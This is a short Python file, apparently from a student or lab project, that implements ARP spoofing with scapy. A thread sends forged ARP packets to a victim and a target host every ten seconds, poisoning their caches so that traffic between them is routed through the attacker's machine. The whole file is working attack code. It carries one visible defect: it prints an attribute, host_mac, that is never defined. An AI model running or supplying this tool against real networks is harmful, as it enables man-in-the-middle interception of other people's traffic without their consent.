# script for ARP spoofing
# written by Abdel K. Bokharouss and Adriaan Knapen
import threading
from time import sleep

from ip_to_mac import IPtoMACDict
from network_discoverer import NetworkDiscoverer
import scapy.config
import scapy.route
from scapy.all import *
from scapy.layers.l2 import ARP, Ether


class ArpSpoof(threading.Thread):

    def __init__(self, vIP=None, tIP=None):
        self.vIP = vIP
        self.tIP = tIP
        self.own_mac_address = NetworkDiscoverer.get_own_mac_address()
        threading.Thread.__init__(self)

    def spoof_arp(self):
        print([self.host_mac, self.tIP, self.vIP])
        sendp([
            Ether() / ARP(op=ARP.who_has, hwsrc=self.own_mac_address, psrc=self.tIP, pdst=self.vIP),
            Ether() / ARP(op=ARP.who_has, hwsrc=self.own_mac_address, psrc=self.vIP, pdst=self.tIP)
        ])

    def run(self):
        while True:
            self.spoof_arp()
            sleep(10)
